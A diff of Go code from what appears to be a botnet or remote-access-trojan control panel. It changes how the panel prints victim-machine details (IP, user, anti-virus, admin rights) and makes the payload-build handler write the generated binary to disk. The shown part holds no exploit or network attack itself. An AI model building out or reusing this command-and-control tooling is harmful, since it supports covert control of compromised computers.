@@ -39,9 +39,7 @@ func show_bot_info(bot *common.Client) {
 	fmt.Println("🌐 IP: " + bot.Ip)
 	fmt.Println("👽 Who: " + bot.Whoami)
 	fmt.Println("💻 OS: " + bot.Os)
-	install, _ := strconv.ParseInt(bot.Installdate, 10, 64)
-	t := time.UnixMilli(install)
-	fmt.Println("📅 InstallDate: " + t.Format("2006-01-02 15:04:05"))
+	fmt.Println("📅 InstallDate: ", bot.Installdate)
 	admin := "yes"
 	if bot.Isadmin != admin {
 		admin = "no"
@@ -50,10 +48,8 @@ func show_bot_info(bot *common.Client) {
 	fmt.Println("😈 Anti-Virus: " + bot.Antivirus)
 	fmt.Println("🤖 CPU: " + bot.Cpuinfo)
 	fmt.Println("🎭 GPU: " + strings.TrimSpace(bot.Gpuinfo))
-	lastseen, _ := strconv.ParseInt(bot.Lastseen, 10, 64)
-	t = time.UnixMilli(lastseen)
-	fmt.Println("🔬 Lastseen: " + t.Format("2006-01-02 15:04:05"))
-	fmt.Println("👾 Version: v" + bot.Version)
+	fmt.Println("🔬 Lastseen: " + bot.Lastseen)
+	fmt.Println("👾 Version: " + bot.Version)
 	fmt.Println("🐾 --------------------------------------------------- 🐾")
 }
 
@@ -453,7 +449,16 @@ func clear_handler() {
 }
 
 func build_handler() {
-	BuildPayload()
+	payload, path := BuildPayload()
+	if nil == payload {
+		fmt.Println("[-] Failed to build payload")
+		return
+	}
+	if utils.WriteBinary(path, payload) {
+		fmt.Println("[+] Successfully built payload, path: " + path)
+	} else {
+		fmt.Println("[-] Failed to build payload")
+	}
 }
 
 func Panel() {
